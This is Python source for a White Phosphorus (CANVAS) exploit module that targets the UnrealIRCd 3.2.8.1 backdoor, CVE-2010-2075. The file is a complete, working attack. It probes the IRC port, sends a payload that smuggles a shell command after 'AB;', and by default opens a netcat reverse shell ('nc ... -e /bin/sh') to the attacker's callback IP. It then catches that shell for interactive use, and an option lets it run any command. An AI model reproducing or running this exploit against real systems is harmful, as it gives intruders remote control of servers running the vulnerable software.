
#! /usr/bin/env python
######################################################################################
# White Phosphorus Exploit Pack
#
# Proprietary source code - use only under the license agreement in distribution
#
######################################################################################


#Standard Imports
import sys 
sys.path.append(".")
sys.path.append("3rdparty/White_Phosphorus/libs")

import os
import socket
import sys
import time
from struct import *

# CANVAS modules
from wp_exploit import *
from wp_dialog import *
from wp_osversions import *
import canvasengine
from MOSDEF import mosdef 
from MOSDEF.mosdefutils import *
from MOSDEFShellServer import MosdefShellServer

from shelllistener import shelllistener
from shelllistener import *
from unixShellNode import unixShellNode
from libs.ctelnetlib import Telnet

######################################################################################
NAME = "UnrealIRCd 3.2.8.1 Remote Backdoor"
DESCRIPTION = "Exploits a remote backdoor in UnrealIRCd 3.2.8.1"
VERSION = "1.0"
DOCUMENTATION = {}
DOCUMENTATION['VENDOR']='UnrealIRCd'
DOCUMENTATION["Date public"] = "2010-06-12"
DOCUMENTATION["Repeatability"] = "Unlimited"
DOCUMENTATION['CVE Name']="CVE-2010-2075"
DOCUMENTATION['CVE Url'] = 'http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-2075'
DOCUMENTATION['CVSS'] = '7.5'
DOCUMENTATION["References"] = "http://www.unrealircd.com/txt/unrealsecadvisory.20100612.txt"
DOCUMENTATION["Notes"] = """
"""

# Targets
PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Linux"] ]
PROPERTY['VERSION'] = [ "All" ]


NOTES="""
WP> White Phosphorus Exploit Pack
---------------------------------------------------------------
Usage:
-T (check if target is vulnerable)
-v <version to target>
-t <target ip>   -p <target port>
-l <callback ip>

Payload Options:
-O payload:<#>   (will use default if not specified)
-O command:<cmd> (for Execute Command payload)

Versions:
0: Linux - UnrealIRCd v3.2.8.1

Payloads:
0: TCP Connect Back
1: Execute Command

Example:
./3rdparty/White_Phosphorus/exploits/wp_unreal3281_backdoor/wp_unreal3281_backdoor.py  -v0 -t 10.1.1.10 -l 10.1.1.1  -O payload:0
"""

PORT = 6667
######################################################################################

# Dialog Hooks
def dialog_update(gtk, wt):
    wp_dialog_update(gtk, wt, theexploit, targets, PORT)
    return

targets = {
    0 : ["Linux - UnrealIRCd v3.2.8.1", (0x00000000, 0x00000000, 0x0000), []]
}

class theexploit(wp_exploit):
            ######################################################################################
            ## WP> Dialog Information
            ##########################s############################################################
    PAYLOADS=["TCP Connect Back",
              "Execute Command"]

    DEFAULT_PAYLOAD = 0

    def __init__(self):
        tcpexploit.__init__(self)
        self.host = "127.0.0.1"
        self.port = PORT
        self.targets = targets
        self.version = 0
        self.badstring = ".,:;\x00\x0a\x0d"
        self.setInfo(DESCRIPTION)
        self.setInfo(VERSION)
        self.name = NAME
        self.autoVersioned = False
        self.rcv_port = 11012
        return

    def usage(self):
        print """
WP> White Phosphorus Exploit Pack
---------------------------------------------------------------
Usage:
-T (check if target is vulnerable)
-v <version to target>
-t <target ip>   -p <target port>
-l <callback ip>

Payload Options:
-O payload:<#>   (will use default if not specified)
-O command:<cmd> (for Execute Command payload)

Versions:
0: Linux - UnrealIRCd v3.2.8.1

Payloads:
0: TCP Connect Back
1: Execute Command

Example:
./3rdparty/White_Phosphorus/exploits/wp_unreal3281_backdoor/wp_unreal3281_backdoor.py  -v0 -t 10.1.1.10 -l 10.1.1.1 -O payload:0
"""
        return  
    
    def test(self):
        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))
        
        ret = 0
        try:
            s = self.gettcpsock()
            s.connect((self.host, self.port))
            s.send("\n")
            recv_str = s.recv(512)
        except:
            self.log("WP> IRC Service not found")
            return ret
            
        if ((recv_str.find("Looking up your hostname")) > 0):
            self.log("WP> IRC Service Found")
            ret = 1
        else:
            self.log("WP> IRC Service not found")
            
        return ret

    def neededListenerTypes(self):
        self.getArgs()
        return self.wp_createWin32Listener()

    def createShellcode(self):
        self.getArgs()

        self.log('WP> Targeting version %d: %s'%(self.version,targets[self.version][0]))
        return   

    def getArgs(self):
        # Command line options
        if not getattr(self, 'RunFromGUI',False):
            if self.argsDict.has_key("payload"):
                p =int(self.argsDict["payload"])
                self.argsDict["payloadType"] = self.PAYLOADS[p]
            else:
                self.argsDict["payloadType"] = self.PAYLOADS[self.DEFAULT_PAYLOAD]
        
        if self.argsDict.has_key("command"):
            p = self.argsDict["command"]
            self.argsDict["payloadExecCmd"] = p
        
        if self.argsDict.get('payloadType','') == 'Execute Command':
            self.shell_EXECCMD = True
            self.execCMD = self.argsDict.get('payloadExecCmd')
        else:
            self.shell_EXECCMD = False
            self.execCMD = False
            
        self.shell_TCPCONNECTBACK = True # to cause the ip:port to be populated
        
        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))
        return

    def displayVersions(self):
        for t in targets.keys():
            print 'WP> Version %d: %s'%(t,targets[t][0])
        return

    def makesploit(self):
        if self.shell_EXECCMD:
            payload = "AB;" + self.execCMD + " &"
        else:
            payload = "AB;nc -n " + self.callback.ip + " " + str(self.rcv_port) + " -e /bin/sh &"
        return payload

    def run(self):
        self.getArgs()
        
        payload = self.makesploit()
        
        if self.execCMD:
            self.log('WP> Running command: %s' % (self.execCMD))
            
            try:
                s = self.gettcpsock()
                s.connect((self.host, self.port))
                
                self.log("WP> Sending Exploit")
                s.recv(128)
                s.sendall(payload)
            except:
                self.log("WP> Attack reported no open socket - service died?")
                self.setInfo("WP> %s attacking %s:%d - completed (failed!)"%(NAME,self.host,self.port))
                return 0
            time.sleep(5)
            s.close()
            
            self.setInfo("WP> %s attacking %s:%d - completed"%(NAME,self.host,self.port))
            self.log("WP> Command executed successfully (if reply required try TCP Connectback)")
            return 1
        else:
            lsock = self.gettcplistener(self.rcv_port,self.callback.ip)
            if lsock == 0: 
                self.log("WP> Unable to list on port %d"%self.rcv_port)
                self.setInfo("WP> %s attacking %s:%d - completed (failed!)"%(NAME,self.host,self.port))
                return 0
            self.log("WP> Listening on port %d"%self.rcv_port)
            
            try:
                s = self.gettcpsock()
                s.connect((self.host, self.port))
                
                self.log("WP> Sending Exploit")
                s.recv(128)
                s.sendall(payload)
            except:
                self.log("WP> Attack reported no open socket - service died?")
                self.setInfo("WP> %s attacking %s:%d - completed (failed!)"%(NAME,self.host,self.port))
                return 0
            time.sleep(3)
            s.close()
        
            self.log("WP> Awaiting connectback")
            lsock.set_timeout(30)
            try:
                (s2, addr) = lsock.accept()
                s2.set_timeout(2)
            except:
                self.log("WP> Connectback failed")
                self.setInfo("WP> %s attacking %s:%d - completed (failed!)"%(NAME,self.host,self.port))
                return 0
            
            telnetshell=Telnet()
            telnetshell.sock=s2
            
            try:
                shell = shelllistener(shellfromtelnet(telnetshell), logfunction=self.logfunction, simpleShell=1)
            except:
                self.log("WP> Shell listener failed - connection closed")
                self.setInfo("WP> %s attacking %s:%d - completed (failed!)"%(NAME,self.host,self.port))
                return 0
            
            node = unixShellNode()
            node.parentnode = self.argsDict["passednodes"][0]        
            node.shell = shell

            self.setInfo("WP> %s attacking %s:%d - completed"%(NAME,self.host,self.port))
            return node


if __name__== '__main__':
    print 'WP> Running White Phosphorus %s Exploit v %s'%(NAME,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()
